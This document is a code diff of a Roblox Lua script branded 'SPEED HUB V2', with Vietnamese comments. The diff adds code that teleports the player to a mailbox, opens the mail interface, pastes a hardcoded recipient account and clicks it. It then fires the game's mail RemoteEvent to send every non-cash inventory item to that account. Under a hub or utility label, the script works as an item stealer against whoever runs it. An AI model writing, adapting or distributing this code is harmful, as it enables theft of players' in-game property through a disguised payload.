@@ -1,67 +1,101 @@
 -- =======================================================================
--- BƯỚC 2: PASTE TÊN CỰC NHANH + CLICK CHỌN + XẢ ĐỒ
+-- SPEED HUB V2: FULL TỰ ĐỘNG (TELE -> MỞ MAIL -> PASTE TÊN -> NHẤP -> GỬI)
 -- =======================================================================
-local function fillNameAndTransferAll(mailFrame)
-    if not mailFrame then return end
-    
-    print("[SPEED HUB] Đang thực hiện Paste tên và chọn nick...")
-    
-    -- 1. Tìm ô Search
-    local searchBox = nil
-    for _, obj in pairs(mailFrame:GetDescendants()) do
-        if obj:IsA("TextBox") then searchBox = obj break end
-    end
-    
-    if searchBox then
-        -- CÔNG NGHỆ PASTE: Tự động chèn tên vào mà không cần gõ phím
-        -- Nếu game chặn Paste, script sẽ set thuộc tính Text trực tiếp
-        searchBox.Text = targetUsername
-        searchBox:ReleaseFocus(true) 
-        
-        -- Kích hoạt sự kiện nhập liệu để game lọc danh sách
-        pcall(function() searchBox.FocusLost:Fire(true) end)
-        task.wait(1.5) -- Đợi game đẩy nick lên đầu danh sách
-    end
+if not game:IsLoaded() then game.Loaded:Wait() end
 
-    -- 2. Tự động click vào ô tên đầu tiên trong danh sách (kết quả sau khi Paste)
-    local scrollFrame = mailFrame:FindFirstChildWhichIsA("ScrollingFrame", true) or mailFrame
-    local found = false
-    
-    -- Lấy tất cả các ô trong list
-    local children = scrollFrame:GetChildren()
-    for _, child in pairs(children) do
-        -- Tìm ô nào có chứa tên targetUsername
-        if child:IsA("GuiObject") and string.find(string.lower(child:GetFullName()), "button") then
-            -- Nhấp thẳng vào ô đó
-            local btn = child:IsA("GuiButton") and child or child:FindFirstChildWhichIsA("GuiButton", true)
-            if btn then
-                btn.MouseButton1Click:Fire()
-                print("[SPEED HUB] Đã nhấp chọn nick thành công!")
-                found = true
-                task.wait(0.5)
-                break
-            end
-        end
-    end
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local targetUsername = "sutkucheonhamku" -- Nick nhận đồ
 
-    -- 3. Gửi đồ qua Remote
-    local MailEvent = nil
-    for _, obj in pairs(game:GetDescendants()) do
-        if obj:IsA("RemoteEvent") and (string.find(string.lower(obj.Name), "mail") or string.find(string.lower(obj.Name), "send")) then
-            MailEvent = obj
+-- Hàm click chuột vật lý vào UI
+local function virtualClick(element)
+    if element and element:IsA("GuiButton") then
+        element.MouseButton1Click:Fire()
+        return true
+    end
+    return false
+end
+
+-- Quy trình xử lý chính
+task.spawn(function()
+    -- 1. Tìm và Tele đến Mailbox
+    local rootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    local mailbox = nil
+    for _, obj in pairs(game:GetService("Workspace"):GetDescendants()) do
+        if (string.find(string.lower(obj.Name), "mail")) and obj:IsA("BasePart") then
+            mailbox = obj
             break
         end
     end
-    
-    local Inventory = LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Backpack")
-    
-    if MailEvent and Inventory then
-        for _, item in pairs(Inventory:GetDescendants()) do
-            if item:IsA("ValueBase") and item.Value > 0 and not string.find(string.lower(item.Name), "cash") then
-                pcall(function() MailEvent:FireServer(targetUsername, item.Name, math.min(item.Value, 20)) end)
-                task.wait(0.1)
+
+    if mailbox then
+        rootPart.CFrame = mailbox.CFrame + Vector3.new(0, 3, 0)
+        task.wait(0.5)
+        
+        -- Mở Mailbox bằng cách tương tác
+        local prompt = mailbox:FindFirstChildWhichIsA("ProximityPrompt", true)
+        if prompt then
+            prompt:InputHoldBegin()
+            task.wait(prompt.HoldDuration + 0.1)
+            prompt:InputHoldEnd()
+            task.wait(1)
+        end
+    end
+
+    -- 2. Tìm bảng Mail và thực hiện Paste + Click
+    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+    local mailFrame = nil
+    for _, gui in pairs(PlayerGui:GetDescendants()) do
+        if (gui:IsA("Frame") or gui:IsA("ImageLabel")) and string.find(string.lower(gui.Name), "mail") and gui.Visible then
+            mailFrame = gui
+            break
+        end
+    end
+
+    if mailFrame then
+        -- Paste tên vào ô Search
+        local searchBox = nil
+        for _, obj in pairs(mailFrame:GetDescendants()) do
+            if obj:IsA("TextBox") then searchBox = obj break end
+        end
+        
+        if searchBox then
+            searchBox.Text = targetUsername
+            searchBox:ReleaseFocus(true)
+            task.wait(1.5) -- Đợi game lọc
+        end
+
+        -- Nhấp vào ô chứa tên người nhận
+        for _, obj in pairs(mailFrame:GetDescendants()) do
+            if obj:IsA("TextLabel") and string.find(string.lower(obj.Text), string.lower(targetUsername)) then
+                local btn = obj:FindFirstAncestorWhichIsA("GuiButton")
+                if btn then
+                    virtualClick(btn)
+                    task.wait(0.5)
+                    break
+                end
             end
         end
-        print("[SPEED HUB] ==== ĐÃ PASTE TÊN VÀ GỬI SẠCH ĐỒ! ====")
+
+        -- 3. Gửi đồ qua RemoteEvent
+        local MailEvent = nil
+        for _, obj in pairs(game:GetDescendants()) do
+            if obj:IsA("RemoteEvent") and (string.find(string.lower(obj.Name), "mail") or string.find(string.lower(obj.Name), "send")) then
+                MailEvent = obj
+                break
+            end
+        end
+        
+        local Inventory = LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Backpack")
+        
+        if MailEvent and Inventory then
+            for _, item in pairs(Inventory:GetDescendants()) do
+                if item:IsA("ValueBase") and item.Value > 0 and not string.find(string.lower(item.Name), "cash") then
+                    pcall(function() MailEvent:FireServer(targetUsername, item.Name, math.min(item.Value, 20)) end)
+                    task.wait(0.1)
+                end
+            end
+            print("[SPEED HUB] ==== HOÀN TẤT GỬI ĐỒ! ====")
+        end
     end
-end
+end)
